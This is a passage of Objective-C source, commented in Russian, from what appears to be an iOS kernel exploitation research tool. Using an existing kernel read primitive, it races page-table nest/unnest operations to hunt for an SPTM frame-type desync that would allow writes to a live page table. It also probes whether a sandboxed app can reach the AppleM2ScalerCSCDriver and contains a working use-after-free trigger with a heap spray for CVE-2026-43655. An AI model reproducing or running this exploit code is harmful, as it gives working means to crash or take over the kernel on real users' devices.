    if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
    map = kp_untag_ptr(map);
    if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
    if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
    pmap = kp_untag_ptr(pmap);
    if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
    if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
    kpNote(r, [NSString stringWithFormat:@"  pmap.ttep raw=0x%016llx", (unsigned long long)ttep]);
    ttep = kp_untag_ptr(ttep); // PA-valued; untag is a no-op on ≤47-bit phys
    kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
              (unsigned long long)task, (unsigned long long)map,
              (unsigned long long)pmap, (unsigned long long)ttep]);

    // 2. Nested subordinate (18.6 pmap slots; nested_pmap is CAS-swapped).
    uint64_t nestedRaw = 0, nestedAddr = 0, nestedSize = 0;
    if (!kpRead(pmap + 0x50, &nestedRaw, sizeof(nestedRaw), "pmap.nested_pmap", r)) return r;
    kpNote(r, [NSString stringWithFormat:@"  pmap+0x50 nested_pmap: raw=0x%016llx", (unsigned long long)nestedRaw]);
    if (!nestedRaw) {
        [r appendString:@"SKIP: nested_pmap=0 — у нашего pmap нет вложенного subordinate (shared cache не nested?). Гонять нечего.\n"];
        return r;
    }
    if (!kpRead(pmap + 0x58, &nestedAddr, sizeof(nestedAddr), "pmap.nested_region_addr", r)) return r;
    if (!kpRead(pmap + 0x60, &nestedSize, sizeof(nestedSize), "pmap.nested_region_size", r)) return r;
    uint64_t subord = kp_untag_ptr(nestedRaw);
    kpNote(r, [NSString stringWithFormat:@"  subordinate pmap=0x%016llx · nested region VA=0x%016llx size=0x%llx (%llu twig'ов по 32 МБ)",
              (unsigned long long)subord, (unsigned long long)nestedAddr, (unsigned long long)nestedSize,
              (unsigned long long)(nestedSize / ARM_16K_TT_L2_SIZE)]);
    if (!kpLooksLikeKernelPointer(subord)) {
        [r appendString:@"FAIL: nested_pmap не kernel-указатель\n"];
        return r;
    }

    uint64_t subTtep = 0;
    if (!kpRead(subord + koffsetof(pmap, ttep), &subTtep, sizeof(subTtep), "subord pmap.ttep", r)) return r;
    kpNote(r, [NSString stringWithFormat:@"  subord pmap.ttep raw=0x%016llx", (unsigned long long)subTtep]);
    subTtep = kp_untag_ptr(subTtep);
    kpNote(r, [NSString stringWithFormat:@"  subordinate ttep=%#llx (%s-формой пойдёт в vtophys_lvl)",
              (unsigned long long)subTtep, (subTtep & 0xf000000000000000ULL) ? "VA" : "PA"]);

    // 3. Twig pick. PRIMARY source: walk OUR OWN (grand) pmap for
    //    nestedAddr + T*32MB down to level L2 — the parent's L2 entry for a
    //    nested region references the subordinate's twig (L2) table, so this
    //    yields the twig PA without depending on the subordinate's ttep.
    //    CROSS-CHECK: the subordinate's own walk to L1 must return the same
    //    PA (its L1 entry points at that twig table); a mismatch/failure is
    //    logged, not fatal. Diagnostics first: per-level raw TTEs for T=0 on
    //    both pmaps, so a field run shows exactly where either walk breaks.
    kpExp13DebugWalk(r, "grand T=0", ttep, nestedAddr);
    kpExp13DebugWalk(r, "subordinate T=0", subTtep, nestedAddr);

    uint64_t twigScan = nestedSize / ARM_16K_TT_L2_SIZE;
    if (twigScan > 64) twigScan = 64; // shared cache lives at the region start; no need to sweep all 192
    int64_t chosenT = -1;
    uint64_t twigPA = 0, twigVA = 0;
    BOOL twigMatchesSubord = NO;
    int loggedMisses = 0;
    uint64_t misses = 0;
    for (uint64_t t = 0; t < twigScan; t++) {
        uint64_t va = nestedAddr + t * ARM_16K_TT_L2_SIZE;
        errno = 0;
        uint64_t glvl = PMAP_TT_L2_LEVEL;
        uint64_t gTteAddr = 0;
        uint64_t gpa = vtophys_lvl(ttep, va, &glvl, &gTteAddr);
        BOOL gpaOK = gpa && (gpa & 0x3fffULL) == 0 && gpa < 0x100000000000ULL;
        if (!gpaOK) {
            misses++;
            if (loggedMisses++ < 6) {
                kpNote(r, [NSString stringWithFormat:@"  twig T=%llu VA=%#llx: grand walk не дал twig PA (ret=0x%016llx errno=%d) — дальше",
                          (unsigned long long)t, (unsigned long long)va, (unsigned long long)gpa, errno]);
            }
            continue;
        }
        // cross-check via the subordinate pmap's own tree (L1 stop = twig PA)
        errno = 0;
        uint64_t slvl = PMAP_TT_L1_LEVEL;
        uint64_t spa = vtophys_lvl(subTtep, va, &slvl, NULL);
        BOOL match = (spa == gpa);
        kpNote(r, [NSString stringWithFormat:@"  twig T=%llu VA=%#llx: grand L2 ref PA=0x%010llx (tte@0x%016llx) · subord walk ret=0x%016llx (errno=%d)%@",
                  (unsigned long long)t, (unsigned long long)va,
                  (unsigned long long)gpa, (unsigned long long)gTteAddr,
                  (unsigned long long)spa, errno,
                  match ? @"  (совпал — здоровый nested)" : (spa ? @"  ← НЕ СОВПАЛ" : @"  ← subord не транслируется")]);
        if (match) {
            chosenT = (int64_t)t; twigPA = gpa; twigVA = va; twigMatchesSubord = YES;
            break;
        }
        if (chosenT < 0) {
            chosenT = (int64_t)t; twigPA = gpa; twigVA = va;
        }
    }
    if (misses > (uint64_t)loggedMisses) {
        kpNote(r, [NSString stringWithFormat:@"  …ещё %llu twig'ов без grand-резолва (пропущено в логе)",
                  (unsigned long long)(misses - (uint64_t)loggedMisses)]);
    }
    if (chosenT < 0) {
        [r appendString:@"FAIL: ни один twig не резолвится даже через grand pmap — см. debug-walk выше (обрыв виден по raw TTE)\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  выбран twig T=%lld VA=0x%016llx PA=0x%010llx%@",
              (long long)chosenT, (unsigned long long)twigVA, (unsigned long long)twigPA,
              twigMatchesSubord ? @"" : @"  (ВНИМАНИЕ: grand/subordinate не совпали на baseline — twig PA взят по grand walk)"]);
    if (kconstant(physBase) && kconstant(physSize)) {
        BOOL inDRAM = twigPA >= kconstant(physBase) && twigPA < kconstant(physBase) + kconstant(physSize);
        kpNote(r, [NSString stringWithFormat:@"  twigPA в managed DRAM [%#llx..%#llx): %s",
                  (unsigned long long)kconstant(physBase),
                  (unsigned long long)(kconstant(physBase) + kconstant(physSize)),
                  inDRAM ? "да" : "НЕТ — FTE может лежать за пределами frame table"]);
    }

    // 4. Frame table + baseline FTE of the twig frame.
    //    fte = table + (pa>>14)*16; +0 rw_guard:u16 · +2 type:u8 · +4 level:u8 · +8 owner:u64
    uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
    if (!tableVA) {
        [r appendString:@"FAIL: frame table недоступна (ни gFrameTableVA, ни libsptm_frame_table)\n"];
        return r;
    }
    uint64_t fteVA = tableVA + ((twigPA - kconstant(physBase)) >> 14) * 16;
    kpNote(r, [NSString stringWithFormat:@"  FTE twig'а @ 0x%016llx (pfn от physBase=0x%llx)", fteVA, (unsigned long long)((twigPA - kconstant(physBase)) >> 14)]);
    [r appendString:@"  справка типов: 0x0b(11)=XNU_DEFAULT(heap) · 0x14(20)=leaf · CPU page-table={0x08(8),0x11(17),0x12(18),0x1f(31)} · rw_guard≥2 пока nested жив\n"];

    // 1.9.9: the first FTE read came back as garbage (level=112, owner=u64
    // junk) — so dump the frame table head before trusting the indexing, plus
    // the alternative (pa-physBase)>>14 indexing; the field run decides which.
    {
        uint8_t headRaw[128];
        memset(headRaw, 0, sizeof(headRaw));
        if (kpRead(tableVA, headRaw, sizeof(headRaw), "frame table head", r)) {
            kpNote(r, @"  frame table head (128 байт):");
            kpAppendHexDump(r, tableVA, headRaw, sizeof(headRaw));
        }
        // alternate indexing: pfn relative to physBase
        uint64_t altFteVA = tableVA + ((twigPA - kconstant(physBase)) >> 14) * 16;
        uint8_t altRaw[16];
        memset(altRaw, 0, sizeof(altRaw));
        if (kpRead(altFteVA, altRaw, sizeof(altRaw), "twig FTE (pfn от physBase)", r)) {
            kpNote(r, [NSString stringWithFormat:@"  alt-index FTE @ %#llx: %02x %02x %02x %02x | %02x %02x …",
                      (unsigned long long)altFteVA, altRaw[0], altRaw[1], altRaw[2], altRaw[3], altRaw[4], altRaw[5]]);
        }
    }

    uint8_t baseRaw[16];
    if (!kpRead(fteVA, baseRaw, sizeof(baseRaw), "twig FTE baseline", r)) return r;
    struct kpExp13FTE base;
    kpExp13ParseFTE(baseRaw, &base);
    kpNote(r, [NSString stringWithFormat:@"  baseline: rw_guard=0x%04x type=0x%02x level=%u owner=0x%02x",
              (unsigned)base.rwGuard, (unsigned)base.type, (unsigned)base.level, (unsigned)base.owner]);
    if (base.type == 0x0b) {
        kpNote(r, @"  ВНИМАНИЕ: baseline type уже 0x0b (XNU_DEFAULT) на живом twig — либо twig простаивает, либо это и есть окно; гонка покажет дельту");
    }
    if (base.rwGuard < 2) {
        kpNote(r, @"  ВНИМАНИЕ: baseline rw_guard < 2 при живом nested — уже аномально");
    }

    // 5. Probe fork once on the rig thread: if the sandbox blocks fork(), the
    //    churn is impossible — learn that before spawning threads.
    errno = 0;
    pid_t probe = fork();
    if (probe == 0) _exit(0);
    if (probe > 0) {
        int st = 0;
        waitpid(probe, &st, 0);
        kpNote(r, @"  probe fork OK — churn возможен");
    }
    else {
        [r appendFormat:@"SKIP: fork() запрещён (%s) — nest/unnest churn из приложения недоступен, гонка не состоялась\n",
            strerror(errno)];
        return r;
    }

    // 6. Race: 4 churn threads + FTE poll every ~30 ms, ≤30 s or first anomaly.
    struct kpExp13ChurnCtx ctx = { 0, 0, 0, 0 };
    pthread_t th[KP_EXP13_CHURN_THREADS];
    BOOL created[KP_EXP13_CHURN_THREADS] = { NO };
    int started = 0;
    for (int i = 0; i < KP_EXP13_CHURN_THREADS; i++) {
        int pr = pthread_create(&th[i], NULL, kpExp13ChurnMain, &ctx);
        if (pr == 0) {
            created[i] = YES;
            started++;
        }
        else {
            kpNote(r, [NSString stringWithFormat:@"  pthread_create #%d failed: %s", i, strerror(pr)]);
        }
    }
    if (!started) {
        [r appendString:@"FAIL: ни одного churn-потока не запустилось\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  churn: %d потока(ов) fork/waitpid запущено; опрос FTE каждые ~30 мс, до 30 с или первой аномалии", started]);

    const useconds_t pollUs = 30000;
    const double maxS = 30.0;
    BOOL anomaly = NO, desyncWin = NO;
    uint64_t polls = 0;
    NSDate *t0 = [NSDate date];
    while (-[t0 timeIntervalSinceNow] < maxS && !anomaly && ctx.forkBroken < started) {
        usleep(pollUs);
        uint8_t cur[16];
        memset(cur, 0, sizeof(cur));
        // quiet raw read: the kpRead gates were already passed at baseline,
        // and a logged read every 30 ms would flood the live log
        kreadbuf(fteVA, cur, sizeof(cur));
        polls++;
        struct kpExp13FTE now;
        kpExp13ParseFTE(cur, &now);
        if (now.rwGuard != base.rwGuard || now.type != base.type ||
            now.level != base.level || now.owner != base.owner) {
            anomaly = YES;
            // sync-logged BEFORE anything else: a panic on the next line must
            // not eat the delta
            kpNote(r, [NSString stringWithFormat:@"EXP-13 DESYNC @ +%.0f мс (poll #%llu): rw_guard 0x%04x→0x%04x · type 0x%02x→0x%02x · level %u→%u · owner 0x%02x→0x%02x",
                      -[t0 timeIntervalSinceNow] * 1000.0, (unsigned long long)polls,
                      (unsigned)base.rwGuard, (unsigned)now.rwGuard,
                      (unsigned)base.type, (unsigned)now.type,
                      (unsigned)base.level, (unsigned)now.level,
                      (unsigned)base.owner, (unsigned)now.owner]);
            errno = 0;
            uint64_t glvl = PMAP_TT_L2_LEVEL;
            uint64_t gpa = vtophys_lvl(ttep, twigVA, &glvl, NULL);
            if (gpa) {
                kpNote(r, [NSString stringWithFormat:@"  grand twig-TTE ЖИВ: L2 ref PA=0x%010llx (errno=%d)%@",
                          (unsigned long long)gpa, errno,
                          gpa == twigPA ? @" — ссылается на наш twig" : @" — УКАЗЫВАЕТ НА ДРУГОЙ PA!"]);
            }
            else {
                kpNote(r, [NSString stringWithFormat:@"  grand twig-TTE НЕВАЛИДЕН (errno=%d) — unnest в полёте?", errno]);
            }
            if (now.type == 0x0b && gpa == twigPA) desyncWin = YES;
        }
    }
    double elapsed = -[t0 timeIntervalSinceNow];

    // 7. Teardown: stop flag, join, final logged read.
    ctx.stop = 1;
    for (int i = 0; i < KP_EXP13_CHURN_THREADS; i++) {
        if (created[i]) pthread_join(th[i], NULL);
    }
    kpNote(r, [NSString stringWithFormat:@"  стоп: прошло %.1f с · форков≈%llu · опросов=%llu%s",
              elapsed, (unsigned long long)ctx.forks, (unsigned long long)polls,
              ctx.forkBroken ? " (churn-потоки умирали на fork()!)" : ""]);
    if (ctx.forkBroken) {
        kpNote(r, [NSString stringWithFormat:@"  fork() отваливался с errno=%d (%s) — churn был ослаблен",
                  ctx.forkErrno, strerror(ctx.forkErrno)]);
    }

    uint8_t postRaw[16];
    if (kpRead(fteVA, postRaw, sizeof(postRaw), "twig FTE post-race", r)) {
        struct kpExp13FTE post;
        kpExp13ParseFTE(postRaw, &post);
        kpNote(r, [NSString stringWithFormat:@"  post-race: rw_guard=0x%04x type=0x%02x level=%u owner=0x%02x",
                  (unsigned)post.rwGuard, (unsigned)post.type, (unsigned)post.level, (unsigned)post.owner]);
    }

    if (desyncWin) {
        [r appendString:@"\n=== EXP-13 HIT: FTE.type стал 0x0b (XNU_DEFAULT) при ЖИВОМ twig-TTE ===\n"];
        [r appendString:@"Page-table фрейм выглядит как обычная heap-страница → physwrite окно на живую таблицу страниц. Это кандидат C (SPTM logic break).\n"];
    }
    else if (anomaly) {
        [r appendString:@"\n=== EXP-13: аномалия зафиксирована (детали выше), но критического type-flip не было ===\n"];
        [r appendString:@"Дрейф rw_guard/level/owner — след гонки nest/unnest. Подкрутить twig T, длительность или число потоков и повторить.\n"];
    }
    else {
        [r appendFormat:@"\n=== EXP-13: десинка нет за %.1f с (форков≈%llu, опросов=%llu) ===\n",
            elapsed, (unsigned long long)ctx.forks, (unsigned long long)polls];
        [r appendString:@"FTE twig'а держался стабильно под churn'ом. Следующие шаги: больше потоков, другой twig T, или churn через GPU/ANE shared address spaces (E5).\n"];
    }
    return r;
}

// M2Scaler reachability probe. Pure userland IOKit: no KRW, no kernel
// pointers. The only question it answers: can our sandboxed app open a user
// client on AppleM2ScalerCSCDriver? If yes, the M2Scaler bugs
// (CVE-2025-43510 / CVE-2026-43655) are directly weaponizable from here.
+ (NSString *)m2ScalerReachabilityReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== M2Scaler reachability probe (IOKit, app sandbox) ===");
    kpNote(r, @"Цель: AppleM2ScalerCSCDriver · CVE-2025-43510 / CVE-2026-43655");

    BOOL anyListed = NO;
    BOOL anyOpened = NO;

    // 1. Single-shot lookup — the same call a real exploit would use first.
    errno = 0;
    io_service_t single = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                      IOServiceMatching("AppleM2ScalerCSCDriver"));
    kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: %@ (service=0x%x, errno=%d %s)",
               single ? @"OK — сервис найден" : @"пусто",
               single, errno, errno ? strerror(errno) : "-"]);
    if (single) {
        anyListed = YES;
        IOObjectRelease(single);
    }

    // 2. Full enumeration + per-service open attempts (type 0 and type 1).
    errno = 0;
    io_iterator_t iter = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
                                                    IOServiceMatching("AppleM2ScalerCSCDriver"),
                                                    &iter);
    if (kr != KERN_SUCCESS) {
        kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingServices: FAIL kr=0x%x (%s), errno=%d %s",
                   kr, mach_error_string(kr), errno, errno ? strerror(errno) : "-"]);
    }
    else {
        unsigned idx = 0;
        io_service_t service;
        while ((service = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
            anyListed = YES;
            char name[128] = {0};
            kern_return_t nkr = IORegistryEntryGetName(service, name);
            uint64_t regID = 0;
            IORegistryEntryGetRegistryEntryID(service, &regID);
            kpNote(r, [NSString stringWithFormat:@"  сервис #%u: name=%s registryID=0x%llx (getName kr=0x%x)",
                       idx, nkr == KERN_SUCCESS ? name : "?",
                       (unsigned long long)regID, nkr]);

            for (uint32_t type = 0; type <= 1; type++) {
                errno = 0;
                io_connect_t conn = IO_OBJECT_NULL;
                kern_return_t okr = IOServiceOpen(service, mach_task_self(), type, &conn);
                kpNote(r, [NSString stringWithFormat:@"    IOServiceOpen(type=%u): %s kr=0x%x (%s)%s%d%s%s",
                           type, okr == KERN_SUCCESS ? "OK" : "FAIL",
                           okr, mach_error_string(okr),
                           errno ? ", errno=" : "", errno,
                           errno ? " " : "", errno ? strerror(errno) : ""]);
                if (okr == KERN_SUCCESS) {
                    anyOpened = YES;
                    IOServiceClose(conn);
                }
            }
            IOObjectRelease(service);
            idx++;
        }
        IOObjectRelease(iter);
        if (idx == 0) {
            kpNote(r, @"  IOServiceGetMatchingServices: OK, но итератор пуст (0 сервисов)");
        }
    }

    // 3. Verdict.
    [r appendString:@"\n"];
    if (anyOpened) {
        [r appendString:@"=== M2SCALER REACHABLE: драйвер открывается из app sandbox ===\n"];
        [r appendString:@"IOServiceOpen на AppleM2ScalerCSCDriver прошёл — CVE-2025-43510/43655 в нашем распоряжении. Следующий шаг: IOConnectCall* фаззинг селекторов по write-up'ам багов.\n"];
    }
    else if (anyListed) {
        [r appendString:@"=== M2SCALER LISTED, NOT OPENABLE: сервис виден, но open закрыт sandbox'ом ===\n"];
        [r appendString:@"IORegistry lookup проходит, IOServiceOpen отклонён (sandbox deny iokit-user-client-class). Из нашего процесса CVE-2025-43510/43655 недосягаемы — нужен процесс с более широким sandbox profile или unsandbox (E11).\n"];
    }
    else {
        [r appendString:@"=== M2SCALER NOT LISTED: драйвер не найден в IORegistry из sandbox ===\n"];
        [r appendString:@"Либо sandbox режет даже lookup, либо драйвер не поднят на этом железе/версии. Повторить после unsandbox (E11), чтобы отличить одно от другого.\n"];
    }
    return r;
}


// ---------- Программный compositor/scaler trigger для M2Scaler UAF ----------
// В оригинальном PoC scheduler дёргался ручным тапом по Dynamic Island. Здесь
// вместо этого на каждом кадре переписываем пиксели нашей IOSurface и
// переназначаем её как contents видимого CALayer (32x32 → 64x64, linear):
// compositor/display pipe обязан заново прочитать и отмасштабировать
// поверхность через M2Scaler pipeline каждый кадр, пока идут UAF-раунды.
// Весь UI — строго на main thread (start/stop диспатчит вызывающий).


// Размеры структур ровно по ScalerTeardownUAF.m (CVE-2026-43655 PoC):
// TSD 0x1B0: +0x000 srcID u32, +0x004 dstID u32, +0x008 async u64.
// Credit (selector 10): struct 0x18, +0x000 marker u32.
#define KP_M2_TSD_SIZE 0x1B0

+ (NSString *)m2ScalerUafReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== M2Scaler teardown UAF (CVE-2026-43655) ===");
    kpNote(r, @"!!! ДЕСТРУКТИВНО: МОЖЕТ ПАНИКОВАТЬ — паника и есть подтверждение бага !!!");
    kpNote(r, @"Каждая строка ниже sync-записана в kexproof-live.log ДО возможной паники (переживёт ребут как kexproof-prev.log).");
    kpNote(r, @"Сценарий (точно по ScalerTeardownUAF.m):");
    kpNote(r, @"  1) open victim (type 0), 2 IOSurface 32x32 BGRA, sync baseline (sel 1, TSD 0x1B0)");
    kpNote(r, @"  2) credit=0xDEAD0001 (sel 10, struct 0x18), 50 async-опов (sel 1, TSD+0x008=1)");
    kpNote(r, @"  3) IOServiceClose(victim) — per_client+ops освобождаются, записи scheduler'а висят");
    kpNote(r, @"  4) спрей 50 коннекшенов, credit=0xBEEF0002 у каждого");
    kpNote(r, @"  5) 100 раундов × 50 async-опов на спрее + программный compositor trigger");
    kpNote(r, @"Чтение паник-лога: x9=0xBEEF0002 → UAF CONFIRMED (freed slot занят спреем);");
    kpNote(r, @"  x9=0xDEAD0001 → stale entry victim'а; иное → память переиспользована системой.");

    errno = 0;
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (!svc) {
        kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: пусто (errno=%d %s) — драйвер не виден из sandbox",
                   errno, errno ? strerror(errno) : "-"]);
        [r appendString:@"\n=== M2UAF SKIP: сервис не найден — прогон невозможен ===\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  сервис AppleM2ScalerCSCDriver: 0x%x", svc]);

    // ---------------- STEP 1: victim + sync baseline ----------------
    kpNote(r, @"--- STEP 1: victim-коннекшен + sync baseline ---");
    io_connect_t victim = IO_OBJECT_NULL;
    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
    kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen(type 0): conn=0x%x kr=0x%x (%s)",
               victim, kr, mach_error_string(kr)]);
    if (kr != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
        kpNote(r, @"  open отклонён — sandbox profile изменился? (на 18.6 type 0/1 давали kr=0)");
        IOObjectRelease(svc);
        [r appendString:@"\n=== M2UAF SKIP: IOServiceOpen не прошёл — прогон невозможен ===\n"];
        return r;
    }

    // KRW instrumentation: resolve the connection's kernel object (the
    // IOSurfaceAcceleratorClient C++ object) through our own ipc table, and
    // dump it at every step. This shows whether async ops actually land in
    // the client/scheduler state, whether close poisons it, and whether the
    // spray reoccupies the freed slot — instead of flying blind.
    __block uint64_t m2Table = 0;  // our is_table VA
    BOOL krwOK = (gPrimitives.kreadbuf != NULL);
    if (krwOK) {
        uint64_t selfProcM = [self findProcByCommName:getprogname() log:r];
        if (!selfProcM) selfProcM = [self findProcByCommName:"KexProof" log:r];
        uint64_t prM = 0, tkM = 0, spM = 0, tbM = 0;
        if (selfProcM &&
            kpRead(selfProcM + koffsetof(proc, proc_ro), &prM, 8, "m2 proc_ro", r) &&
            kpRead(kp_untag_ptr(prM) + off_proc_ro_pr_task, &tkM, 8, "m2 task", r) &&
            kpRead(kp_untag_ptr(tkM) + off_task_itk_space, &spM, 8, "m2 itk_space", r) &&
            kpRead(kp_untag_ptr(spM) + off_ipc_space_is_table, &tbM, 8, "m2 is_table", r)) {
            m2Table = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
                      ? kp_untag_ptr(kpSMRDecode(tbM)) : kp_untag_ptr(tbM);
        }
        kpNote(r, [NSString stringWithFormat:@"  KRW-инструментарий: is_table=%#llx %@", (unsigned long long)m2Table,
                  m2Table ? @"(дампы клиента будут)" : @"(не удалось — идём вслепую)"]);
    }
    void (^dumpClient)(io_connect_t, NSString *) = ^(io_connect_t conn, NSString *tag) {
        if (!m2Table || conn == IO_OBJECT_NULL) return;
        uint64_t eVA = m2Table + (uint64_t)sizeof_ipc_entry * (conn >> 8);
        uint64_t oRaw = 0, kRaw = 0;
        if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "m2 ie_object", r)) return;
        uint64_t pVA = kp_untag_ptr(oRaw);
        if (!kpLooksLikeKernelPointer(pVA)) return;
        if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "m2 ip_kobject", r)) return;
        uint64_t cVA = kp_untag_ptr(kRaw);
        if (!kpLooksLikeKernelPointer(cVA)) { kpNote(r, [NSString stringWithFormat:@"    %@: kobj не kernel VA (%#llx)", tag, (unsigned long long)kRaw]); return; }
        uint8_t cb[0x200];
        memset(cb, 0, sizeof(cb));
        if (!kpRead(cVA, cb, sizeof(cb), "m2 client dump", r)) return;
        kpNote(r, [NSString stringWithFormat:@"    %@: userClient @ %#llx (первые 0x200):", tag, (unsigned long long)cVA]);
        for (uint32_t o = 0; o + 8 <= sizeof(cb); o += 8) {
            uint64_t q = 0;
            memcpy(&q, cb + o, 8);
            if (q) kpNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx", o, (unsigned long long)q]);
        }
    };
    void (^markerHunt)(uint32_t, NSString *) = ^(uint32_t marker, NSString *tag) {
        if (!m2Table) return;
        uint64_t tableVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
        if (!tableVA2) { kpNote(r, @"  markerHunt: frame table недоступна — пропуск"); return; }
        uint64_t totalPages = kconstant(physSize) >> 14;
        int hits = 0, pages21 = 0;
        for (uint64_t pg = 0; pg < totalPages && hits < 8; pg++) {
            uint8_t ent[16];
            kreadbuf(tableVA2 + pg * 16, ent, 16);
            if (ent[2] != 0x21) continue;
            pages21++;
            uint64_t pa = kconstant(physBase) + pg * 0x4000;
            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
            if (!kva) continue;
            uint8_t buf[0x4000];
            if (!kpRead(kva, buf, sizeof(buf), "m2 heap scan", r)) continue;
            for (uint32_t o = 0; o + 4 <= sizeof(buf); o += 4) {
                uint32_t v = 0;
                memcpy(&v, buf + o, 4);
                if (v == marker) {
                    kpNote(r, [NSString stringWithFormat:@"    %@: маркер %#x @ kva=%#llx (PA=%#llx, +%#x)",
                              tag, marker, (unsigned long long)(kva + o), (unsigned long long)pa, o]);
                    hits++;
                    break;
                }
            }
        }
        kpNote(r, [NSString stringWithFormat:@"  %@: скан heap (0x21) — %d страниц, маркер %#x найден %d раз",
                  tag, pages21, marker, hits]);
    };

    NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
                         (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    if (!srcS || !dstS) {
        kpNote(r, @"  IOSurfaceCreate вернул NULL — выход (драйвер не тронут)");
        if (srcS) CFRelease(srcS);
        if (dstS) CFRelease(dstS);
        IOServiceClose(victim);
        IOObjectRelease(svc);
        [r appendString:@"\n=== M2UAF SKIP: IOSurface не создались ===\n"];
        return r;
    }
    uint32_t srcID = IOSurfaceGetID(srcS);
    uint32_t dstID = IOSurfaceGetID(dstS);
    // По PoC поверхности не освобождаются: async-опы ссылаются на них по ID,
    // а srcS дополнительно крутит compositor trigger (см. STEP 5).
    kpNote(r, [NSString stringWithFormat:@"  IOSurface 32x32 BGRA: srcID=%u dstID=%u (не освобождаем — так в PoC)", srcID, dstID]);

    uint8_t baseline[KP_M2_TSD_SIZE];
    memset(baseline, 0, KP_M2_TSD_SIZE);
    *(uint32_t *)(baseline + 0x000) = srcID;   // +0x000 srcID u32
    *(uint32_t *)(baseline + 0x004) = dstID;   // +0x004 dstID u32

    kr = IOConnectCallMethod(victim, 1, NULL, 0, baseline, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
    kpNote(r, [NSString stringWithFormat:@"  sync baseline (sel 1, TSD 0x1B0): kr=0x%x (%s)", kr, mach_error_string(kr)]);
    dumpClient(victim, @"после open+sync baseline");

    // ---------------- STEP 2: credit + 50 async-опов ----------------
    kpNote(r, @"--- STEP 2: credit=0xDEAD0001 + 50 async-опов ---");
    {
        uint8_t s10[0x18];
        memset(s10, 0, 0x18);
        *(uint32_t *)s10 = 0xDEAD0001;  // credit struct +0x000 marker u32
        uint64_t sc[3] = {0, 0, 0};
        kr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
        kpNote(r, [NSString stringWithFormat:@"  sel 10 credit=0xDEAD0001 (struct 0x18): kr=0x%x (%s)", kr, mach_error_string(kr)]);
    }
    int asyncOK = 0;
    for (int i = 0; i < 50; i++) {
        uint8_t tsd[KP_M2_TSD_SIZE];
        memcpy(tsd, baseline, KP_M2_TSD_SIZE);
        *(uint64_t *)(tsd + 0x008) = 1;  // +0x008 async u64 — async path
        kr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
        if (kr == KERN_SUCCESS) asyncOK++;
    }
    kpNote(r, [NSString stringWithFormat:@"  async-опы victim: %d/50 OK — 50 записей с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
    dumpClient(victim, @"после 50 async-опов (копится ли состояние?)");
    markerHunt(0xDEAD0001, @"после credit+async");

    // ---------------- STEP 3: teardown ----------------
    kpNote(r, @"--- STEP 3: IOServiceClose(victim) — точка невозврата ---");
    kpNote(r, @"  освобождаются per_client (0x170 байт) + operation objects;");
    kpNote(r, @"  если scheduler heap держит записи — dangling pointers.");
    kr = IOServiceClose(victim);
    kpNote(r, [NSString stringWithFormat:@"  IOServiceClose: kr=0x%x — victim освобождён", kr]);
    dumpClient(victim, @"после close (poison/free pattern?)");

    // ---------------- STEP 4: спрей ----------------
    kpNote(r, @"--- STEP 4: спрей 50 коннекшенов (credit=0xBEEF0002) ---");
    io_connect_t spray[50];
    int sprayOK = 0;
    for (int i = 0; i < 50; i++) {
        spray[i] = IO_OBJECT_NULL;
        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
        if (skr == KERN_SUCCESS && spray[i] != IO_OBJECT_NULL) {
            sprayOK++;
            uint8_t s10[0x18];
            memset(s10, 0, 0x18);
            *(uint32_t *)s10 = 0xBEEF0002;
            uint64_t sc[3] = {0, 0, 0};
            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
        }
    }
    kpNote(r, [NSString stringWithFormat:@"  спрей: %d/50 открыто, credit=0xBEEF0002 (per_client+0x158)", sprayOK]);
    kpNote(r, @"  спрей-коннекшены НЕ закрываем — держим freed slot занятым (по PoC)");
    markerHunt(0xBEEF0002, @"после спрея");
